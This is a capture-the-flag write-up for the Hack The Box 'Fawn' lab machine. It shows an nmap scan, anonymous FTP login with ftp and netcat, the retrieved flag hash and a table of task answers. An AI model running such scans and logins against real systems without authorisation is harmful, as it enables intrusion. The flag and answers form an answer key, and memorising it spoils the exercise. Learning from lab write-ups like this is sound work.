# Hack The Box - Fawn (Starting Point)

**Difficulty:** Very Easy  
**OS:** Linux  
**Category:** Starting Point - Tier 0  
**Date:** 09 August 2026  
**Author:** gargamell

---

## 1. Enumeration

```bash
nmap -sC -sV 10.129.246.9
```

**Result:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```

- Only port **21** is open
- Service: **vsftpd 3.0.3**
- Anonymous login is allowed
- A file named `flag.txt` is present

---

### Method 1: Using the FTP client (recommended)

```bash
ftp 10.129.246.9
```

```
Name: anonymous
Password: (just press Enter)
```

Once connected:

```bash
ls
get flag.txt
exit
```

```bash
cat flag.txt
```

**Output:**
```
035db21c881520061c53e0536e44f815
```

### Method 2: Using netcat (manual)

```bash
nc 10.129.246.9 21
```

```
USER anonymous
PASS
```

→ You receive `230 Login successful.`

(Note: Downloading the file with pure netcat is more complicated because of passive mode.)

---

## 3. Flag

```
035db21c881520061c53e0536e44f815
```

---

## 4. Lessons Learned

- Always start with a proper `nmap` scan (`-sC -sV`)
- Anonymous FTP is still very common
- FTP response codes:
  - `220` → Service ready
  - `331` → Username OK, need password
  - `230` → Login successful
- Prefer the real `ftp` client instead of raw netcat for file transfers

---

## 5. Tasks Answers (Starting Point)

| Task | Answer |
|------|--------|
| What does FTP stand for? | File Transfer Protocol |
| Which port does FTP usually run on? | 21 |
| FTP service version | vsftpd 3.0.3 |
| OS type | Unix |
| Username for anonymous login | anonymous |
| Response code for successful login | 230 |
```